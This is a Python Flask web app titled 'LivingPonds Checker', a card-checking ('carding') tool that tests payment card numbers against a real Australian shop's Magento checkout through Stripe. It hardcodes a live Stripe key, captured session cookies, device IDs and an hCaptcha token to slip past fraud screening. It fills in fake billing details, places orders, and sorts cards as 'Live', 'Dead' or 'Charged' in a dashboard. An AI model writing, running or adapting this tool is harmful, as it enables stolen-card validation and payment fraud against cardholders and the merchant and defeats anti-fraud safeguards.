from flask import Flask, request, jsonify, render_template_string
import requests
import random
import time
import uuid
import re
from datetime import datetime
from collections import deque
import threading

app = Flask(__name__)

# ================= CONFIGURATION =================
STRIPE_PK = "pk_live_51QBpW3CSUyWFRv1F1BlrlZOjar9z8cVx4CzPIpEqe1P6vQGvBD5BwSwm998v51I7xVMj3G7YzMKiOwNfYCxw0wCq00xySSFhML"
GATEWAY_URL = "https://www.livingponds.com.au/rest/default/V1/guest-carts/{cart_id}/payment-information"
CART_ID = "nMLacWeaqaOgfCw2WbQ0Milvo4KqZjU3"

# ================= HARDCODED COOKIES (from sb.txt) =================
COOKIES = {
    '_ga': 'GA1.1.456076624.1768037848',
    '__stripe_mid': '835b2ea9-6dac-4f2a-9012-308a595d4baccacb1c',
    'PHPSESSID': 'ede0cab1d22c4666903055b54caacf96',
    'form_key': '2A7WWrvOKGqFkLHr',
    '__stripe_sid': 'f04cecad-eeff-422b-a0bb-cd2ef00145877f066e',
    'cf_clearance': '3D8SoSi4f21DZTSzmpRqkb9WgtB9MflA1_Dq9IccYqM-1769781943-1.2.1.1-O6wTi_Hlu6xjByW.IwB8KI.jTOA6Ml0E9.V32i2_IgUnMqtGOd01tkLrIQPmV4GLNmOTRMSVWHiC0EpMAEwZAMoIcHYjfFQapgCFe9gkLBxXEFY0lE0yJEODl_albxTxyS6WfBTAUNuETqtej9ZW5dYqQCK3jlSCrkCrQQ97Yio5Br16Yi7daJ6w7C6MWk03g0a4o0r2UWXKwhmrH5gomEpE8tcQSqGxyWCH7aISJMY',
    'private_content_version': 'a813838acf586e266267b3b1fe8acb35',
}

# ================= HARDCODED STRIPE IDs (from sb.txt) =================
STRIPE_MUID = '835b2ea9-6dac-4f2a-9012-308a595d4baccacb1c'
STRIPE_SID = 'f04cecad-eeff-422b-a0bb-cd2ef00145877f066e'
STRIPE_GUID = '0beea62b-3fdf-41c1-b0bc-570bda223a46aafe5f'
CLIENT_SESSION_ID = 'f68ecd0d-9d55-4777-aa3a-63b2bb77aae5'

# ================= HARDCODED HCAPTCHA TOKEN (from sb.txt) =================
HCAPTCHA_TOKEN = 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY5NzgyMTI0LCJjZGF0YSI6IjM5KzJBaVgxQjRiNG1GNXFPQTlpdGNPMkprVlpIejZGY3ZlT2JXM0lCbkkyR2FBQVFxV2d1cXNZZnVkTVNaUmFkYW5teTZIVlNyM2xjWXo1SCtmNUxGQUFmVjZxeHVNWUo5QTdHeTIzMjVwbTRnY2pKNHErcFFJYW1iNncxdzIyOXhZMjNjYWw1UzlmSmdSU0RSNU5QMnFVZHlORG12ZFYrZm9DR3lEQ0dsM1JYMDlLWlJLRGJjczZDU2ZPMU1oMHAxNWJZVk11N2hzWm94ZDFMSFZyT3J5bnF2SnR0YWNTT0Jic1I0YTNBUFlhV2hhUi9LRCtrWFNFZ2ZUQU5QVmc2WEc0UjVydDdiejNkbVduc3NSOFNwdmdZRUMwZGl5aVZmWTZNUE0xUG4xbEptL01NTmhOVHplRVFIWkVwYXptc1MyUUVVVUtXSzRsMnI5aEtHZ3NlZUcvS2JlcVlweDJjdGlFa1E0bUo5dz1idzc3ZllhVVp4aHVDTHdVIiwicGFzc2tleSI6IjBQL0tMUFRCVDdSNFVBRlRTWE5yejBRd09ta1JBMHJicWJTaVdpRy8rSENVOUdCZkxhZmVhOTJNdXpLRVhvYUpqcW1rY2szcGZ3a3I4ck9FNHM1YUVnZVMwZTlURmZRRUJLbDM3ZjlqTURKMnV5eXZsbC9oTVVoSUpkUjhvOW90WFhYbkhCb3NVa2xyMUJvY1pDZmtOUDE1eXVwMnowemhwTFpOVytWWVJ0NG5RMkdDb0hKSFdOV2hhM0ZadkRqOUUzZU44TmFleDVlNkRrdkx3aGRqdXJZdjlnTU9ldmcxV2ZBVXg5RG40WTkvRDVJbXVBanBadldaMkRXZG12Zmd1TkhGNUgwby9rcm0zZ3Z1bVZlbFlRRndDNVN5VXZZNWJMT3lnaE14dnhUZ0J1Mjl6YnV3TktBakVVUXRsU0JrWlM1QXpqMzJ4ZjNDenh0SERXMk1KVjU1dVlVUmozOEdtSnBlVzFUKzZIMzcxSHNuVFMxRnY0b0pTTkRFZ1pkNmVTcnhxVGUrR3FIVjJnUzFCaWo3ck9vSzFTM2JIZWdQK0JuRUJ4Z21CZS9OZllzSzNGM3ViK2x5RTF6YUl0LzNlTmF4eWIveXN2a0VTb0NQRytvSE00WUdxcS9jZHpkM0hGWU9ybDI4dXNTN2l6RHBlWm1rSTdHODkrNXhvSXVBQ010M3BRblBHNWhwaExOVG8yMk1Ra0QvMnZxZ200U0dCM2dlTEsvQ052ZlNMdnVmRjRIVUNCdGRDeVN0UkMvYUphck5iQ1ZoczRPV1ROSVRCYzJLbHJZZzhKLzcrYjhMOWF6clFCUUNUMHRqdGhHcWF0OVp1R3ZmT3N0eExiVWdHMmdnaVA2aGZVbmdRdGN0WVEwV0hZRmhNNWFXMUxIT2d0eDh2VU92VDFnZU9IcDh3TEZEZnR5SHg0dXlVM2c1NFIyenZYNTJOaWZlYVl2Z1pEc2RPclMwd1FHcnY5R1MwaWxxOWRCTjREbnRaZ1o1bmZtWll2RnpURkR5MHdwekRFK3VCOTFQdkxJTWQvaVFISW9tOGdneDNrMXVleWtoV2taRGFxbUJLMEtxV2VQamlqY2xsVnJtSmFMS2tCV0NGN1k0VnZOSWFYamZOTWFxZWxvMHQ4QlVmYmxoL2NnVFc2YVl2cUwvbUpPMVVjMHVwYk1Wdzl1b2tuQTY2ZTZDSlZaYTRteXd1Qy8yY0N1RUpoVC9JalFYQlNVRkRKdWhqMUpqZStYSEd3ZERBR2tVREFtRE52a2JPQ0lteWVURW9KWTdZZTl1TzVYOFpOVW4yT3lwdng4bkt0czFVZ21OMklqeXEwbWtDa2pVbjlTTCtReDk3WWlnb2MyUWlnMWZtN2w4YnR2NU9ENHdZbFJBTm1uRkRYcDBsUDRRYnkzQ1B6THJpVDFQS2EyUmp2ZnBuY0s4bjVJYTh3cDRqT0dTQ1VvLzZZOXIzSWs0Zko4L0ZGU1RYMHNiY0VFZDdGQytyMHNYQm5DcUprWHUzRFRlWW9BL2gxb2VrejQzQjBwNk1zY3M1c2x0OEdSeW1EamJJSXFoSVFtYWk4OWlRZVhPM2FTQnNKSFpHS09Md3NPdWdqQS9kN2wzYVhBTzhRYmZlOHlBU1dScHZQMStvMWZ3eVB5NnNSQ0VhRXFuNHp0anFOUm82UE9wYmYvMUc3bGQxZ2E2UE1CeXR0MjZVWUJTVlFkcG9zUldJSUhWUWZPRXRzWHE4SlR4TTNXQzFodEN1UFJZVmdvbG1oWkFrNExmVEVwTDQzRER3SUZGdDc3SmJrTEgzWW9RNUJzUUZDSG8rTklQNDIvSk9YaUZUc056NENBOFN1Uy96U3JySkplaG1mUE9xNi9uVkRxdVdUQ3VEZHRJeStvQUVDbmdybEJSVTJwTHpobUlSYnhkKy9mYUNpZ1dWeDJSMGVHbHo5Q3dNYUQ2RWlGT25kc3V0Y2JZUEp0L2hDcHNqUnZrZXhvWHpkNnlybzVDMHpZZDhON0xhaVd6VUxVTWZSdm9oYytYNlU3bmxicTZNWGt4YXJXZHdGMHJUR0ZIaWkxQWpHTVV4bGdUKzhDVGhZeWpVV0kwMWNhc1VoWlAvUFhLR0tuUFRxWDlqZGhpcjhnajVtdlhHdk9ROHRoQUFCV0tZK3Z5OUo2TnBFOWJQRFFLOUoyTDJwK3loNEE1NmJGV0JraytaeVM0K0lHamw1bUxQNUtwcG9rY2RLb2JkenphVUprYlJ6NnhaZFdqN0lMV0gvbDJyL3RLV0dIZ3RnU0JQR013UnhUMkVPVkFHUkltbk5sVy9SeVllSUpVd0poYVp0ZlFiNEFiWmRsa1IrZmU3U0VNdmZ1SGpncFhTUVdJeHd5SGV2Wjd5dVQvajVUeTVSelNmUm41dWZEcFlWd0xXRHdvamg4azJBU1NRdWlmTjVOa1BzdER3RE9SdjJiZ3dXNlNpcFNISlA1amJ5ckYvZzJEOWZPSVNiNmc4d0NnV0U5cUlsSk1GVWhVMVhtaEZqUXBXemZCTlVJNHg1aXhja0wzSjg3aWtYZXFVNlJ5eHpIR280Qm1oazhFTEJzZ1MvakJIQmxUc1I5cGU1WndCa3lnYjlGd3pMVVMvVmlod1R4aEdwTjh4ZWZLNjVRQ002Z1ltRDBHbUd6OC9GK1ZseWpEc2dmd0drZERmdG43TTZvWGV2RmRZM0V5aDAzK3FLTXRKa0pKMEpNb01HVlFmWmJ6RXM2WEo4aERzUFZENmtSaSsrZEVraWNuYzlBK0pUUThNOFZmaHdyVjdxb0ZyVThTb0hlTmM1Y3FDdTI0SXhkS2dKV3ZuQWJTMmZRPSIsImtyIjoiMjAxYWRjZDkiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.jZNu_92ZuFd-_QuSf9KMYF2vK0rj4dVY43xiJutAMs8'


# Live Logs Storage (Thread-Safe)
logs = deque(maxlen=100)
logs_lock = threading.Lock()

def add_log(log_id, step, message, status="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    with logs_lock:
        logs.append({
            "time": timestamp,
            "log_id": log_id,
            "step": step,
            "message": message,
            "status": status
        })

# ================= HELPER FUNCTIONS =================
def get_bin_info(cc):
    try:
        response = requests.get(f"https://lookup.binlist.net/{cc[:6]}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "N/A").upper(),
                "type": data.get("type", "N/A").upper(),
                "brand": data.get("brand", "N/A"),
                "country": data.get("country", {}).get("name", "N/A"),
                "bank": data.get("bank", {}).get("name", "N/A")
            }
    except:
        pass
    return {"scheme": "N/A", "type": "N/A", "brand": "N/A", "country": "N/A", "bank": "N/A"}

def get_random_email():
    chars = 'abcdefghijklmnopqrstuvwxyz'
    return ''.join(random.choices(chars, k=10)) + '@gmail.com'


# ================= CARD CHECK LOGIC =================
def check_card(card_data):
    log_id = str(uuid.uuid4())[:8]
    start_time = time.time()
    
    try:
        # 1. Parse Card
        parts = card_data.replace('/', '|').split('|')
        if len(parts) < 4:
            return {"success": False, "status": "Error", "message": "Invalid format. Use CC|MM|YY|CVV"}
        
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(yy) == 4: yy = yy[-2:]
        
        add_log(log_id, "INIT", f"Checking {cc[:6]}******{cc[-4:]}", "info")
        
        # 2. Get BIN Info
        bin_info = get_bin_info(cc)
        add_log(log_id, "BIN", f"{bin_info['scheme']} - {bin_info['type']} - {bin_info['country']}", "info")
        
        # 3. Use hardcoded hCaptcha Token
        hcaptcha_token = HCAPTCHA_TOKEN
        
        # 4. STEP 1: Create Stripe Payment Method
        add_log(log_id, "STEP 1", "Creating Stripe Payment Method...", "info")
        
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        }
        
        # Use hardcoded Stripe IDs
        muid = STRIPE_MUID
        sid = STRIPE_SID
        guid = STRIPE_GUID
        client_session_id = CLIENT_SESSION_ID
        
        email = get_random_email()
        
        # CRITICAL: Include ALL fields from sb.txt to pass Stripe validation
        stripe_payload = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': '20' + yy,
            'billing_details[name]': 'janta ya',
            'billing_details[email]': email,
            'billing_details[phone]': '6897967577',
            'billing_details[address][country]': 'AU',
            'billing_details[address][state]': 'SA',
            'billing_details[address][city]': 'Brisbane city',
            'billing_details[address][line1]': '1/336 Ipswich Rd',
            'billing_details[address][postal_code]': '4103',
            'allow_redisplay': 'unspecified',
            'payment_user_agent': 'stripe.js/a10732936b; stripe-js-v3/a10732936b; payment-element; deferred-intent; autopm',
            'referrer': 'https://www.livingponds.com.au',
            'time_on_page': str(random.randint(30000, 60000)),
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
            'client_attribution_metadata[elements_session_config_id]': 'df9b4e0b-3e4f-4da9-ad0c-b9c1d87a4283',
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': STRIPE_PK,
            '_stripe_version': '2020-03-02',
            'radar_options[hcaptcha_token]': hcaptcha_token
        }
        
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_payload, timeout=15)
        
        if r1.status_code != 200 or 'id' not in r1.json():
            error_msg = r1.json().get('error', {}).get('message', 'Tokenization Failed')
            add_log(log_id, "STEP 1", f"FAILED: {error_msg}", "error")
            return {
                "success": False,
                "status": "Dead",
                "message": error_msg,
                "bin": bin_info,
                "time": f"{time.time() - start_time:.2f}s"
            }
        
        pm_id = r1.json()['id']
        add_log(log_id, "STEP 1", f"Success! PM: {pm_id}", "success")
        
        # Small delay
        time.sleep(random.uniform(0.3, 0.8))
        
        # 5. STEP 2: Submit to Magento (LivingPonds)
        add_log(log_id, "STEP 2", "Submitting to Magento Gateway...", "info")
        
        # Use hardcoded cookies and cart_id
        current_cookies = COOKIES
        current_cart_id = CART_ID
        
        add_log(log_id, "STEP 2", f"Using Cart: {current_cart_id}", "info")
        
        magento_headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.livingponds.com.au',
            'referer': 'https://www.livingponds.com.au/checkout/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        magento_payload = {
            "cartId": current_cart_id,
            "billingAddress": {
                "countryId": "AU",
                "regionId": "609",
                "regionCode": "SA",
                "region": "South Australia",
                "street": ["1/336 Ipswich Rd", ""],
                "company": "",
                "telephone": "6897967577",
                "postcode": "4103",
                "city": "Brisbane city",
                "firstname": "janta",
                "lastname": "ya",
                "saveInAddressBook": None
            },
            "paymentMethod": {
                "method": "stripe_payments",
                "additional_data": {
                    "payment_method": pm_id
                }
            },
            "email": email
        }
        
        gateway_url = GATEWAY_URL.format(cart_id=current_cart_id)
        r2 = requests.post(gateway_url, headers=magento_headers, cookies=current_cookies, json=magento_payload, timeout=20)
        
        add_log(log_id, "STEP 2", f"Response: {r2.status_code}", "info")
        
        # Parse Response
        try:
            res_text = r2.text
            # Magento returns order ID on success, or error message on failure
            if r2.status_code == 200:
                # Success - Order ID returned
                order_id = res_text.strip('"')
                add_log(log_id, "RESULT", f"APPROVED! Order: {order_id}", "success")
                return {
                    "success": True,
                    "status": "Charged",
                    "message": f"Order Placed: {order_id}",
                    "bin": bin_info,
                    "time": f"{time.time() - start_time:.2f}s"
                }
            else:
                # Error
                try:
                    err_json = r2.json()
                    error_msg = err_json.get('message', res_text[:100])
                except:
                    error_msg = res_text[:100]
                
                # Check for specific decline codes
                if 'insufficient_funds' in error_msg.lower():
                    status = "Live (NSF)"
                elif 'declined' in error_msg.lower():
                    status = "Declined"
                elif 'expired' in error_msg.lower() or 'invalid' in error_msg.lower():
                    status = "Dead"
                elif '3d secure' in error_msg.lower() or 'authentication' in error_msg.lower():
                    status = "3DS Required"
                else:
                    status = "Dead"
                
                add_log(log_id, "RESULT", f"{status}: {error_msg}", "error")
                return {
                    "success": False,
                    "status": status,
                    "message": error_msg,
                    "bin": bin_info,
                    "time": f"{time.time() - start_time:.2f}s"
                }
        except Exception as e:
            add_log(log_id, "RESULT", f"Parse Error: {str(e)}", "error")
            return {
                "success": False,
                "status": "Error",
                "message": str(e),
                "bin": bin_info,
                "time": f"{time.time() - start_time:.2f}s"
            }
            
    except Exception as e:
        add_log(log_id, "ERROR", str(e), "error")
        return {
            "success": False,
            "status": "Error",
            "message": str(e)
        }

# ================= ROUTES =================
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/check', methods=['POST'])
def api_check():
    card_data = request.json.get('card', '')
    if not card_data:
        return jsonify({"success": False, "message": "No card provided"}), 400
    
    result = check_card(card_data)
    return jsonify(result)

@app.route('/api/logs')
def api_logs():
    with logs_lock:
        return jsonify(list(logs))

# ================= HTML TEMPLATE =================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LivingPonds Checker</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0f0f0f;
            --bg-secondary: #1a1a1a;
            --bg-tertiary: #252525;
            --accent: #00d4aa;
            --accent-hover: #00b894;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --success: #00ff88;
            --error: #ff4757;
            --warning: #ffa502;
            --info: #3498db;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            padding: 20px 30px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(90deg, var(--accent), #00ff88);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .status-badge {
            background: var(--accent);
            color: #000;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .main-container {
            display: flex;
            flex: 1;
            gap: 20px;
            padding: 20px;
        }
        
        .left-panel {
            width: 400px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .right-panel {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        .card {
            background: var(--bg-secondary);
            border-radius: 16px;
            padding: 24px;
            border: 1px solid #333;
        }
        
        .card-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--accent);
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .card-title::before {
            content: '';
            width: 4px;
            height: 16px;
            background: var(--accent);
            border-radius: 2px;
        }
        
        .input-group {
            margin-bottom: 16px;
        }
        
        .input-group label {
            display: block;
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 8px;
        }
        
        .input-group input, .input-group textarea {
            width: 100%;
            padding: 14px;
            background: var(--bg-tertiary);
            border: 1px solid #444;
            border-radius: 10px;
            color: var(--text-primary);
            font-size: 14px;
            font-family: 'JetBrains Mono', monospace;
            transition: all 0.3s ease;
        }
        
        .input-group input:focus, .input-group textarea:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 212, 170, 0.1);
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, var(--accent) 0%, #00ff88 100%);
            border: none;
            border-radius: 10px;
            color: #000;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 212, 170, 0.3);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .result-box {
            margin-top: 16px;
            padding: 16px;
            border-radius: 10px;
            display: none;
        }
        
        .result-box.show { display: block; }
        .result-box.success { background: rgba(0, 255, 136, 0.1); border: 1px solid var(--success); }
        .result-box.error { background: rgba(255, 71, 87, 0.1); border: 1px solid var(--error); }
        .result-box.warning { background: rgba(255, 165, 2, 0.1); border: 1px solid var(--warning); }
        
        .result-status {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        .result-message {
            font-size: 13px;
            color: var(--text-secondary);
            word-break: break-all;
        }
        
        .result-meta {
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid #333;
            font-size: 12px;
            color: var(--text-secondary);
        }
        
        .logs-container {
            flex: 1;
            overflow-y: auto;
            background: var(--bg-tertiary);
            border-radius: 10px;
            padding: 16px;
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 12px;
            max-height: 500px;
        }
        
        .log-entry {
            padding: 8px 12px;
            margin-bottom: 6px;
            border-radius: 6px;
            background: rgba(255,255,255,0.03);
            display: flex;
            gap: 12px;
            align-items: flex-start;
        }
        
        .log-time {
            color: var(--text-secondary);
            min-width: 70px;
        }
        
        .log-id {
            color: var(--accent);
            min-width: 70px;
        }
        
        .log-step {
            color: var(--warning);
            min-width: 80px;
            font-weight: 600;
        }
        
        .log-message {
            flex: 1;
        }
        
        .log-entry.success .log-message { color: var(--success); }
        .log-entry.error .log-message { color: var(--error); }
        .log-entry.info .log-message { color: var(--text-primary); }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .checking { animation: pulse 1s infinite; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🌿 LivingPonds Checker</div>
        <div class="status-badge">Magento + Stripe</div>
    </div>
    
    <div class="main-container">
        <div class="left-panel">
            <div class="card">
                <div class="card-title">Card Input</div>
                <div class="input-group">
                    <label>Enter Card (CC|MM|YY|CVV)</label>
                    <input type="text" id="cardInput" placeholder="4111111111111111|12|28|123">
                </div>
                <button class="btn" id="checkBtn" onclick="checkCard()">
                    ⚡ Check Card
                </button>
                
                <div class="result-box" id="resultBox">
                    <div class="result-status" id="resultStatus"></div>
                    <div class="result-message" id="resultMessage"></div>
                    <div class="result-meta" id="resultMeta"></div>
                </div>
            </div>
            
            <div class="card">
                <div class="card-title">Quick Stats</div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                    <div style="background: var(--bg-tertiary); padding: 16px; border-radius: 10px; text-align: center;">
                        <div style="font-size: 24px; font-weight: 700; color: var(--success);" id="liveCount">0</div>
                        <div style="font-size: 12px; color: var(--text-secondary);">Live</div>
                    </div>
                    <div style="background: var(--bg-tertiary); padding: 16px; border-radius: 10px; text-align: center;">
                        <div style="font-size: 24px; font-weight: 700; color: var(--error);" id="deadCount">0</div>
                        <div style="font-size: 12px; color: var(--text-secondary);">Dead</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="right-panel">
            <div class="card" style="flex: 1; display: flex; flex-direction: column;">
                <div class="card-title">Live Logs</div>
                <div class="logs-container" id="logsContainer">
                    <div style="color: var(--text-secondary); text-align: center; padding: 40px;">
                        Waiting for checks...
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let liveCount = 0;
        let deadCount = 0;
        
        async function checkCard() {
            const card = document.getElementById('cardInput').value.trim();
            if (!card) return alert('Enter a card!');
            
            const btn = document.getElementById('checkBtn');
            const resultBox = document.getElementById('resultBox');
            
            btn.disabled = true;
            btn.textContent = '⏳ Checking...';
            btn.classList.add('checking');
            resultBox.classList.remove('show');
            
            try {
                const response = await fetch('/api/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ card })
                });
                
                const data = await response.json();
                showResult(data);
                refreshLogs();
                
            } catch (e) {
                showResult({ status: 'Error', message: e.message });
            }
            
            btn.disabled = false;
            btn.textContent = '⚡ Check Card';
            btn.classList.remove('checking');
        }
        
        function showResult(data) {
            const resultBox = document.getElementById('resultBox');
            const resultStatus = document.getElementById('resultStatus');
            const resultMessage = document.getElementById('resultMessage');
            const resultMeta = document.getElementById('resultMeta');
            
            resultBox.className = 'result-box show';
            
            if (data.status === 'Charged' || data.status === 'Live (NSF)') {
                resultBox.classList.add('success');
                resultStatus.innerHTML = `✅ ${data.status}`;
                liveCount++;
                document.getElementById('liveCount').textContent = liveCount;
            } else if (data.status === '3DS Required') {
                resultBox.classList.add('warning');
                resultStatus.innerHTML = `⚠️ ${data.status}`;
            } else {
                resultBox.classList.add('error');
                resultStatus.innerHTML = `❌ ${data.status}`;
                deadCount++;
                document.getElementById('deadCount').textContent = deadCount;
            }
            
            resultMessage.textContent = data.message;
            
            if (data.bin) {
                resultMeta.innerHTML = `
                    <strong>BIN:</strong> ${data.bin.scheme} | ${data.bin.type} | ${data.bin.country} | ${data.bin.bank}<br>
                    <strong>Time:</strong> ${data.time || 'N/A'}
                `;
            }
        }
        
        async function refreshLogs() {
            try {
                const response = await fetch('/api/logs');
                const logs = await response.json();
                
                const container = document.getElementById('logsContainer');
                if (logs.length === 0) return;
                
                container.innerHTML = logs.reverse().map(log => `
                    <div class="log-entry ${log.status}">
                        <span class="log-time">${log.time}</span>
                        <span class="log-id">[${log.log_id}]</span>
                        <span class="log-step">${log.step}</span>
                        <span class="log-message">${log.message}</span>
                    </div>
                `).join('');
                
                container.scrollTop = 0;
            } catch (e) {
                console.error('Failed to fetch logs:', e);
            }
        }
        
        // Auto-refresh logs every 2 seconds
        setInterval(refreshLogs, 2000);
        
        // Handle Enter key
        document.getElementById('cardInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') checkCard();
        });
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    print("=" * 50)
    print("🌿 LivingPonds Checker - Flask API")
    print("=" * 50)
    print(f"Gateway: {GATEWAY_URL.format(cart_id=CART_ID)}")
    print(f"Stripe PK: {STRIPE_PK[:30]}...")
    print("=" * 50)
    app.run(debug=True, host='0.0.0.0', port=5000)
